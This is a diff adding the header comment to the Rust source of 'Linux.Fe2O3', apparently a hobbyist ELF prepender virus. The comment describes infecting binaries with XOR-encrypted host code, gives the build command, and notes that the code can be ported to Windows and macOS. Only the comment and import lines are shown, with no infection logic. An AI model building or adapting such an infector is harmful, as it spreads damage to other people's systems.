@@ -1,3 +1,26 @@
+/*
+ This is a ELF prepender written in Rust by TMZ (2019).
+ I like writting prependers on languages that I'm learning and find interesting.
+
+ Linux.Fe2O3 (September 2019) - Simple binary infector written in Rust.
+ This version encrypts the host code with a simple XOR and decrypts it at runtime.
+ It's almost a direct port from my Nim infector Linux.Cephei and Go infector Linux.Liora.
+ 
+ Build with: rustc main.rs -o Linux.Fe2O3
+ 
+ Note that Rust version used was rustc 1.37.0 (eae3437df 2019-08-13).
+ It has no external dependencies so it should compile under most systems (tested under x86_64).
+ It's also possible to adapt it to be a PE/Mach infector and compile under Windows/macOS.
+
+ Use at your own risk, I'm not responsible for any damages that this may cause.
+ A big shout for those who keeps the scene alive!
+ 
+ Feel free to email me: thomazi@linux.com || guilherme@guitmz.com 
+ You can also find me at Twitter @TMZvx || @guitmz
+ 
+ https://www.guitmz.com
+*/
+
 use std::ffi::{OsStr, OsString};
 use std::fs::File;
 use std::io::prelude::*;
